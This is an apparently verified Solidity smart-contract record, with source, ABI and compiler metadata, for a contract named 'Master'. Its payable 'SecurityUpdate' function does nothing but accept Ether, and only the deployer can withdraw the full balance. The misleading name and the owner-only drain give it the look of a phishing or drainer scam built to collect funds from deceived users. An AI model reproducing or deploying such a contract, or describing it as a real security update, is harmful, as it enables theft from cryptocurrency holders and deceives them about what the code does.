{"SourceCode": "/// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.0;\r\n\r\ncontract Master {\r\n    address private _executor;\r\n    address[] private _holdTokens;\r\n\r\n    constructor() {\r\n        _executor = msg.sender;\r\n    }\r\n\r\n    receive() payable external {}\r\n\r\n    function SecurityUpdate() public payable {}\r\n\r\n    function withdraw() external {\r\n        require(msg.sender == _executor, \"Access denied\");\r\n        payable(_executor).transfer(address(this).balance);\r\n    }\r\n\r\n    function setExecutor(address _newExector) external {\r\n        require(msg.sender == _executor, \"Access denied\");\r\n        _executor = _newExector;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newExector\",\"type\":\"address\"}],\"name\":\"setExecutor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Master", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://861f7a54705f4c12e0d784bd1b73d64f141d51c81fe7988c2296a45920c2139e"}